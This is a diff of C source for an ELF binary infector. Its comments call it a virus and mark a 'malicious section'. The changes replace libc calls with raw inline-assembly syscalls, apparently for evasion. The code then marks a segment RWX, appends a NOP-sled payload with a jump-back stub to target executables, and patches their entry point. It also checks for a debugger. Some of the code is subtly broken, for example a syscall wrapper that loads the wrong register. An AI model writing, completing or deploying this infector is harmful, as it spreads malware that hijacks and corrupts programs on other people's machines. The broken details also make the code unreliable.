@@ -60,14 +60,73 @@ int activate(){
     return 1; // 
 }
 
-static inline void my_write(int fd, void *buf, int size){
-	__asm__ __volatile__ (  "mov $1, %%eax;"
-							"syscall;"
-							://output
-							://input
-							://chobber
-							);
+void my_memcpy(char* d, char* s, int l){
+    int i=0;
+    while(l--){
+        d[i]=s[i];
+        i++;
+    }
 }
+
+static inline int my_access(const char *fpath, int flag){
+	/*
+     #define R_OK   4   // test for read permission 
+     #define W_OK   2   // test for write permission 
+     #define X_OK   1   // test for execute (search) permission 
+     #define F_OK   0   // test for presence of file 
+	*/
+   long long ret;
+   asm("mov %0, %%rdi"::"r" ((long long)fpath));
+   asm("mov %0, %%rsi"::"r" ((long long)flag));
+   asm("mov $21, %rax");
+   asm("syscall");
+   asm("mov %%rax, %0":"=r"(ret));
+   return ret;
+}
+
+static inline int my_open(const char *fpath, int flag){
+    long long ret;
+    asm("mov %0, %%rsi"::"r"((long long)fpath));
+    asm("mov %0, %%rsi"::"r"((long long)flag));
+    asm("mov $2,%rax");
+    asm("syscall");
+    asm("mov %%rax, %0":"=r"(ret));
+    return ret;
+}
+
+static inline int my_read(unsigned int fd, char *buf, int count){
+    long long ret;
+    asm("mov %0, %%rdi"::"r"((long long)fd));
+    asm("mov %0, %%rsi"::"r"((long long)buf));
+    asm("mov %0, %%rdx"::"r"((long long)count));
+    asm("mov $0,%rax");
+    asm("syscall");
+    asm("mov %%rax, %0":"=r"(ret)::);
+    return ret;
+}
+
+static inline int my_write(unsigned int fd, char *buf, int count){
+    long long ret;
+    asm("mov %0, %%rdi"::"r"((long long)fd));
+    asm("mov %0, %%rsi"::"r"((long long)buf));
+    asm("mov %0, %%rdx"::"r"((long long)count));
+    asm("mov $1,%rax");
+    asm("syscall");
+    asm("mov %%rax, %0":"=r"(ret)::);
+    return ret;
+}
+
+static inline int my_lseek(int fd, int offset, int origin){
+   long long ret;
+   asm("mov %0, %%rdi"::"r"((long long)fd));
+   asm("mov %0, %%rsi"::"r"((long long)offset));
+   asm("mov %0, %%rdx"::"r"((long long)origin));
+   asm("mov $8, %rax");
+   asm("syscall");
+   asm("mov %%rax, %0":"=r"(ret));
+   return ret;
+}
+
 
 void change_entrypoint(const char* fpath){
 	int fd, i, shellcodeloc;
@@ -79,7 +138,7 @@ void change_entrypoint(const char* fpath){
 	Elf64_Phdr phdr;
 	Elf64_Ehdr ehdr;
 	
-	if(access(fpath,R_OK|W_OK|X_OK)!=0){ 
+	if(my_access(fpath,7)!=0){ // R_OK|W_OK|X_OK = 7
 		printf("[ERROR] Permission error(%s)\n",fpath);
 		return 0;
 	}
@@ -87,12 +146,12 @@ void change_entrypoint(const char* fpath){
 		printf("[ERROR] Debugger detected(%s)\n",fpath);
 		return 0;
 	}
-	fd = open(fpath, O_RDWR); // Cannot open virus file itself.
+	fd = my_open(fpath, 2); // O_RDWR = 2
 	if (fd < 0){
 		printf("[ERROR] fd error(%s)\n",fpath);
 		return 0;
 	}
-	if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)){
+	if (my_read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)){
 		printf("[ERROR] ehdr read error(%s)\n",fpath);
 		return 0;
 	}
@@ -104,9 +163,9 @@ void change_entrypoint(const char* fpath){
 	printf("[INFECTED] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
 	
 	// [02] Read page headers info.
-	lseek(fd, ehdr.e_phoff, SEEK_SET); // TAPE : page header start offset
+	my_lseek(fd, ehdr.e_phoff, SEEK_SET); // TAPE : page header start offset
 	for(i=0;i<ehdr.e_phnum;i++){
-		if (read(fd, &phdr, sizeof(phdr)) != sizeof(phdr)){
+		if (my_read(fd, &phdr, sizeof(phdr)) != sizeof(phdr)){
 			//printf("[ERROR] phdr read error(%s)\n",fpath);
 			return 0;
 		}
@@ -114,7 +173,7 @@ void change_entrypoint(const char* fpath){
 			// Find RW_ Data page(Loadable Segment && PF_Read_Write(6)) and add Executable permission.
 			if(phdr.p_type==1 && phdr.p_flags==5){
 				printf("[INFO] phdr.p_flags = %d, phdr.p_vaddr = 0x%x\n",phdr.p_flags,phdr.p_vaddr);
-				lseek(fd, -sizeof(phdr), SEEK_CUR); // go back to start of page header
+				my_lseek(fd, -sizeof(phdr), SEEK_CUR); // go back to start of page header
 				printf("[BEFORE] phdr.p_flags = %d, phdr.p_filesz = 0x%x, phdr.p_memsz = 0x%x\n",phdr.p_flags,phdr.p_filesz,phdr.p_memsz);
 				phdr.p_flags=7; 
 				
@@ -137,14 +196,11 @@ void change_entrypoint(const char* fpath){
 	/*---------------------------------------------------------------------------*/
 	// Section header for malicious section. 
 	
-	filesize = ehdr.e_shoff + (ehdr.e_shentsize * (ehdr.e_shnum+1));
+	filesize = ehdr.e_shoff + (ehdr.e_shentsize * (ehdr.e_shnum));
 	shellcodeloc = phdr.p_vaddr + filesize; 
 	printf("[NEW] shellcodeloc(0x%x) = phdr.p_vaddr(0x%x) + filesize(0x%x)\n",shellcodeloc, phdr.p_vaddr, filesize);
 	
 	printf("[BEFORE] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
-
-	lseek(fd,0,SEEK_END);  
-	my_write(fd, &shdr, sizeof(shdr));
 	
 	
 	/*---------------------------------------------------------------------------*/
@@ -166,7 +222,7 @@ void change_entrypoint(const char* fpath){
 	/* 48 b8 41 41 41 41 41 41 41 41	movabs rax,0x4141414141414141 */
 	jmp2original[0] = 0x48;
 	jmp2original[1] = 0xb8;
-	memcpy(&jmp2original[2], &ehdr.e_entry, sizeof(ehdr.e_entry));
+	my_memcpy(&jmp2original[2], &ehdr.e_entry, sizeof(ehdr.e_entry));
 	
 	/* 48 03 07	add    rax,QWORD PTR [rdi]*/
 	jmp2original[10] = 0x48;
@@ -178,15 +234,16 @@ void change_entrypoint(const char* fpath){
 	jmp2original[14] = 0xe0;
 	
 	
-	// 섹션헤더끝나고 바로쉘코드집어넣기. lseek필요없음
+	// 파일의끝에
+	my_lseek(fd,0,SEEK_END);  
 	memset(shellcode,'\x90',0x1000);
 	my_write(fd,shellcode,0x1000 - sizeof(jmp2original));
 	my_write(fd,jmp2original,sizeof(jmp2original));
 	
-	
+	//gogo
 	//엔트리포인트 수정하기
 	ehdr.e_entry = shellcodeloc;
-	lseek(fd, 0, SEEK_SET);
+	my_lseek(fd, 0, SEEK_SET);
 	//if (my_write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) return 0; //write 실패
 	my_write(fd, &ehdr, sizeof(ehdr));
 	printf("[After ]Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
